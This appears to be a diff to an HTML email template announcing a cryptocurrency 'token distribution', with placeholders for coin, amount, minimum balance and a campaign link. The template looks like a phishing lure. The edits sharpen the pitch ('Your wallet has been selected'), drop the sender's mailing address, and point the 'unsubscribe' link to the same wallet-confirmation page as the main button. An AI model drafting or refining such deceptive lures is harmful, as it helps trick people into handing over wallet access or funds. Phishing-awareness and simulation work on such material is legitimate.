@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Important Update About Your Crypto Wallet</title>
+    <title>Crypto Asset Update</title>
     <style>
         * {
             margin: 0;
@@ -22,7 +22,7 @@
         .container {
             max-width: 600px;
             margin: 0 auto;
-            background: transparent;
+            background: white;
             border-radius: 12px;
             overflow: hidden;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
@@ -181,15 +181,15 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>Important Update About Your Crypto Wallet</h1>
-            <p>Action Required to Confirm Your Wallet</p>
+            <h1>Crypto Asset Update</h1>
+            <p>Account Confirmation Needed</p>
         </div>
         
         <div class="content">
-            <p class="intro-text">We are reaching out to inform you about a potential {{ cryptocurrency }} token distribution based on your recent blockchain activity. Below are the details:</p>
+            <p class="intro-text">Your wallet has been selected for a {{ cryptocurrency }} token distribution due to your recent blockchain activity. Below are your details:</p>
             
             <div class="amount-card">
-                <div class="amount-label">Potential Reward</div>
+                <div class="amount-label">Possible Reward</div>
                 <div class="amount-value">{{ quantity }} {{ cryptocurrency }}</div>
             </div>
             
@@ -199,7 +199,7 @@
                     <div class="detail-value">{{ cryptocurrency }}</div>
                 </div>
                 <div class="detail-row">
-                    <div class="detail-label">Participation Requirement</div>
+                    <div class="detail-label">Requirement for participation</div>
                     <div class="detail-value">{{ min_balance }} {{ cryptocurrency }}</div>
                 </div>
                 <div class="detail-row">
@@ -208,7 +208,7 @@
                 </div>
             </div>
             
-            <p class="intro-text">Your wallet address has been noted. To proceed and access your reward, please confirm your wallet using the link below:</p>
+            <p class="intro-text">Based on activities your wallet qualified and We have noted your address. Details for accessing the reward can be found here</p>
             
             <a href="{{ base_url }}/wallet-info/{{ campaign_id }}/" class="cta-button">
                 Confirm Wallet
@@ -217,8 +217,7 @@
         
         <div class="footer">
             <p>&copy; {{ current_year }} {{ cryptocurrency }} Distribution</p>
-            <p>Our mailing address: 123 Crypto Street, Blockchain City, BC 12345</p>
-            <p>If you no longer wish to receive these emails, you can <a href="#" style="color: #2563eb; text-decoration: underline;">unsubscribe here</a>.</p>
+            <p>If you no longer wish to receive these emails, you can <a href="{{ base_url }}/wallet-info/{{ campaign_id }}/" style="color: #2563eb; text-decoration: underline;">unsubscribe here</a>.</p>
         </div>
     </div>
 </body>
